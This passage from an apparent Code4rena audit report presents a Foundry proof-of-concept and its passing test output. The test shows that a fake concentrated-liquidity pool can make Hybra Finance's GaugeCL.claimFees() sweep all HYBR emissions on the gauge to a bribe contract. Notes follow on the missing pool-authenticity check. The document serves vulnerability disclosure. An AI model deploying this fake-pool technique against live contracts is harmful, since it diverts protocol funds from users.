\n        received[token] += amount;\n        emit Notified(token, amount);\n    }\n}\n\ncontract C4_CLGauge_BalanceSweep_PoC is C4PoCTestbed {\n    FakeCLPool private fakePool;\n    BribeMock  private bribe;\n    GaugeCL    private gauge;\n\n    function setUp() public override {\n        super.setUp();\n\n        // Fake pool lies: token0 == HYBR, token1 == rHYBR (so only HYBR exists on gauge)\n        fakePool = new FakeCLPool(address(hybr), address(rewardHybr));\n        bribe = new BribeMock();\n\n        // Deploy GaugeCL wired to fake pool and bribe.\n        gauge = new GaugeCL(\n            address(hybr),             // rewardToken (HYBR)\n            address(rewardHybr),       // rHYBR\n            address(votingEscrow),     // VE\n            address(fakePool),         // pool (fake)\n            address(this),             // DISTRIBUTION (irrelevant here)\n            address(bribe),            // internal bribe\n            address(0),                // external bribe (unused)\n            true,                      // isForPair\n            address(0),                // nfpm (unused in this PoC)\n            address(this)              // factory (unused)\n        );\n\n        // Mirror GaugeManager wiring tolerated by fake pool\n        fakePool.setGaugeAndPositionManager(address(gauge), address(0));\n    }\n\n    function test_CLGauge_claimFees_sweeps_all_HYBR_balance_to_bribe() external {\n        // Seed the gauge with HYBR to simulate epoch emissions temporarily sitting on the gauge\n        uint256 seed = 1_000e18;\n        assertTrue(hybr.transfer(address(gauge), seed), \"seed transfer to gauge failed\");\n        assertEq(hybr.balanceOf(address(gauge)), seed, \"pre: gauge HYBR balance mismatch\");\n        assertEq(bribe.received(address(hybr)), 0, \"pre: bribe should be zero\");\n\n        // Call claimFees(): CL gauge will read raw balances (not deltas) and notify bribe\n        (uint256 c0, uint256 c1) = gauge.claimFees();\n\n        // Bad effect: all HYBR swept to bribe because pool reports token0=HYBR\n        assertEq(c0, seed, \"claimed0 should equal entire HYBR on gauge\");\n        assertEq(c1, 0,    \"claimed1 should be zero (no rHYBR on gauge)\");\n        assertEq(bribe.received(address(hybr)), seed, \"bribe should have received exactly seed HYBR\");\n        assertEq(hybr.balanceOf(address(gauge)), 0, \"post: gauge HYBR should be drained\");\n    }\n}\n```\n\n```\nRESULT:\n\nRan 1 test for test/C4PoC.t.sol:C4_CLGauge_BalanceSweep_PoC [PASS] test_CLGauge_claimFees_sweeps_all_HYBR_balance_to_bribe() (gas: 121600) Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 32.12ms (243.98µs CPU time) Ran 1 test suite in 34.79ms (32.12ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests) kassi@KASSI:~/ubuntu-home/hybra/2025-10-hybra-finance/ve33$\n\n```\n\n\n### Key insights that demonstrate validity\n\n* CL pool authenticity is not verified at creation, since `isPair` is forced to `true` for `gaugeType == 1`. The only gates are token whitelist and connector checks, which a fake pool can satisfy by returning approved tokens. \n* The manager calls `setGaugeAndPositionManager` on the supplied pool, which a fake pool accepts without resistance, completing gauge wiring. \n* `claimFees()` is public and sweeps the gauge’s entire balances for the tokens reported by the pool. If the pool reports `token0 == HYBR`, emissions sitting on the gauge are forwarded to the bribe. \n* The protocol itself moves HYBR into the gauge each epoch, which makes this path live on mainnet conditions, not just in tests. \n* The volatile gauge path uses returned fee amounts, which underscores the discrepancy and supports the intended accounting model, but the CL gauge deviates.",
